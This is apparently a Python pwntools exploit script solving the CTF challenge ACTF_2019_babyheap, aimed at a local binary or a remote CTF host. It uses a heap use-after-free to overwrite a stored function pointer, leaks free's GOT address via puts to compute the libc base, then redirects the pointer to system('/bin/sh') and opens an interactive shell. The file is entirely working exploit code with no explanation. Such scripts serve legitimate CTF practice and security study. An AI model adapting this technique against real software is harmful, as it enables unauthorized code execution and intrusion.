import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ACTF_2019_babyheap')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ACTF_2019_babyheap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',27573)
			elf=ELF('./ACTF_2019_babyheap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a,b):
			io.sendlineafter('Your choice:','1')
			io.sendlineafter('Please input size:',str(a))
			io.sendafter('Please input content:',b)

		def show(a):
			io.sendlineafter('Your choice:','3')
			io.sendlineafter('Please input list index:',str(a))

		def delete(a):
			io.sendlineafter('Your choice:','2')
			io.sendlineafter('Please input list index:',str(a))

			
		
		add(0x18,'aaaa')
		add(0x78,'0')
		delete(0)
		delete(1)
		add(0x18,p64(elf.got['free'])+p64(elf.plt['puts']))
		show(0)
		io.recv()
		sleep(1)

		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['free']
		libc.address=libc_base
		delete(2)
		add(0x18,p64(libc.search('/bin/sh\x00').next())+p64(libc.sym['system']))
		show(0)



		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue